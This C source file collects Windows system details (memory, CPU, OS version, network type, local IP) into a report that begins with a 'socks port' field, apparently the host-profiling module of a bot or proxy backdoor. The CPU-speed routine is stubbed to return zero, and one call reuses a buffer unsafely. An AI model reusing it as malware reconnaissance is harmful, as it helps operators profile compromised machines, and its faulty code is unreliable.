#include "StdAfx.h"
#include "extern.h"

int GetInfo(char *obuf, DWORD bufsiz)
{
	char *buf;
	char *tmp;
	MEMORYSTATUS ms;
	SYSTEM_INFO si;

	buf = (char*)a(1024);
	tmp = (char*)a(512);

	wsprintf(obuf, "s_port: %d\n", pri_socksport);
	z(&ms, sizeof(ms));
	GlobalMemoryStatus(&ms);

	wsprintf(buf, "mem: mload: %d%% totphys: %luK availphys: %luK totpage: %luK availpage: %luK totvirt: %luK availvirt: %luK\n",
		ms.dwMemoryLoad, ms.dwTotalPhys/1024, ms.dwAvailPhys/1024,
		ms.dwTotalPageFile/1024, ms.dwAvailPageFile/1024,
		ms.dwTotalVirtual/1024, ms.dwAvailVirtual/1024);

	lstrcat(obuf, buf);
	z(&si, sizeof(si));
	GetSystemInfo(&si);

	wsprintf(buf, "sys: arch: ");

	switch(si.wProcessorArchitecture)
	{
		case PROCESSOR_ARCHITECTURE_UNKNOWN:
		lstrcat(buf, "[unknown]");
		break;
		case PROCESSOR_ARCHITECTURE_INTEL:
		lstrcat(buf, "[intel]");
		break;
		case PROCESSOR_ARCHITECTURE_MIPS:
		lstrcat(buf, "[mips]");
		break;
		case PROCESSOR_ARCHITECTURE_ALPHA:
		lstrcat(buf, "[alpha]");
		break;
		case PROCESSOR_ARCHITECTURE_PPC:
		lstrcat(buf, "[ppc]");
		break;
		case PROCESSOR_ARCHITECTURE_IA64:
		lstrcat(buf, "[ia64]");
		break;
		default:
		lstrcat(buf, "[other]");
		break;

	}
	wsprintf(tmp, " cpus: [%d] ", si.dwNumberOfProcessors);
	lstrcat(buf, tmp);

	wsprintf(tmp, "cputype: ");
	switch(si.dwProcessorType) {
		case PROCESSOR_INTEL_386:
		lstrcat(tmp, "[i386]");
		break;
		case PROCESSOR_INTEL_486:
		lstrcat(tmp, "[i486]");
		break;
		case PROCESSOR_INTEL_PENTIUM:
		lstrcat(tmp, "[pentium]");
		break;
		default:
		lstrcat(tmp, "[unknown]");
		break;
	}
	lstrcat(buf, tmp);
	if(si.wProcessorArchitecture==PROCESSOR_ARCHITECTURE_INTEL)
	{
		wsprintf(tmp, " level: ");
		switch(si.wProcessorLevel) {
			case 3:
			lstrcat(tmp, "[Intel 80386]");
			break;
			case 4:
			lstrcat(tmp, "[Intel 80486]");
			break;
			case 5:
			lstrcat(tmp, "[Intel Pentium]");
			break;
			case 6:
			lstrcat(tmp, "[Intel Pentium Pro or Pentium II]");
			break;
			default:
			lstrcat(tmp, "[unknown]");
			break;
		}
		lstrcat(buf, tmp);
	}
	lstrcat(buf, "\n");
	lstrcat(obuf, buf);
	wsprintf(buf, "Os: %s CPUSpeed: %luMhz\n", GetStrOS(), GetCPUSpeed());
	lstrcat(obuf, buf);
	wsprintf(buf, "%s", netinfo(buf));
	lstrcat(obuf, buf);
	f(buf);
	f(tmp);
	return SUCCESS;
}
/*
char *Uptime(int startup)
{
static char buffer[50];

DWORD total = GetTickCount() / 1000 - startup;
DWORD days = total / 86400;
DWORD hours = (total % 86400) / 3600;
DWORD minutes = ((total % 86400) % 3600) / 60;

_snprintf(buffer, sizeof(buffer), "%dd %dh %dm", days, hours, minutes);

return (buffer);
}
*/
char* GetStrOS(void)
{
	static char *os = "unknown";
	switch(OSVersionCheck()) {
		case OS_UNKNOWN:
		break;
		case OS_WIN95:
		os = "win95";
		break;
		case OS_WINNT:
		os = "winNT";
		break;
		case OS_WIN98:
		os = "win98";
		break;
		case OS_WINME:
		os = "winME";
		break;
		case OS_WIN2K:
		os = "win2k";
		break;
		case OS_WINXP:
		os = "winXP";
		break;
		case OS_WIN2K3:
		os = "win2k3";
		break;
		default:
		break;
	}
	return os;
}

int OSVersionCheck(void)
{
	DWORD dwRet = OS_UNKNOWN;

	OSVERSIONINFO verinfo;
	verinfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
	if(GetVersionEx(&verinfo))
	{
		if(verinfo.dwMajorVersion==4&&verinfo.dwMinorVersion==0)
		{
			if(verinfo.dwPlatformId==VER_PLATFORM_WIN32_WINDOWS)
				dwRet = OS_WIN95;
			if(verinfo.dwPlatformId==VER_PLATFORM_WIN32_NT)
				dwRet = OS_WINNT;
		}
		else if(verinfo.dwMajorVersion==4&&verinfo.dwMinorVersion==10)
			dwRet = OS_WIN98;
		else if(verinfo.dwMajorVersion==4&&verinfo.dwMinorVersion==90)
			dwRet = OS_WINME;
		else if(verinfo.dwMajorVersion==5&&verinfo.dwMinorVersion==0)
			dwRet = OS_WIN2K;
		else if(verinfo.dwMajorVersion==5&&verinfo.dwMinorVersion==1)
			dwRet = OS_WINXP;
		else if(verinfo.dwMajorVersion==5&&verinfo.dwMinorVersion==2)
			dwRet = OS_WIN2K3;
		else dwRet = OS_UNKNOWN;
	}
	else
		dwRet = OS_UNKNOWN;

	return (dwRet);
}


// asm for cpuspeed() (used for counting cpu cycles)
#pragma warning( disable : 4035 )
inline unsigned __int64 GetCycleCount(void)
{
	/*_asm {
		_emit 0x0F;
		_emit 0x31;
		}*/
	return 0;
}
#pragma warning( default : 4035 )

// cpu speed function
unsigned __int64 GetCPUSpeed(void)
{
	unsigned __int64 startcycle, speed, num, num2;

	do {
		startcycle = GetCycleCount();
		Sleep(1000);
		speed = ((GetCycleCount()-startcycle)/1000000);
	} while(speed>1000000);

	num = speed%100;
	num2 = 100;
	if(num<80) num2 = 75;
	if(num<71) num2 = 66;
	if(num<55) num2 = 50;
	if(num<38) num2 = 33;
	if(num<30) num2 = 25;
	if(num<10) num2 = 0;
	speed = (speed-num)+num2;

	return (speed);
}



// function used for netinfo
char* netinfo(char *buf)
{
	DWORD n;
	char ctype[8], cname[128];

	// get connection type/name
	memset(cname, 0, sizeof(cname));
	if(!InternetGetConnectedStateEx(&n, (char *)&cname, sizeof(cname), 0))
		sprintf(cname, "Not connected");
	if(n==INTERNET_CONNECTION_MODEM)
		sprintf(ctype, "Dial-up");
	else
		sprintf(ctype, "LAN");
	wsprintf(buf, "net: Type: [%s] (%s) IP Address: [%s] Hostname: [%s]\n", ctype, cname, GetLocalInetAddr(), "...");

	return (buf); // return the netinfo string
}

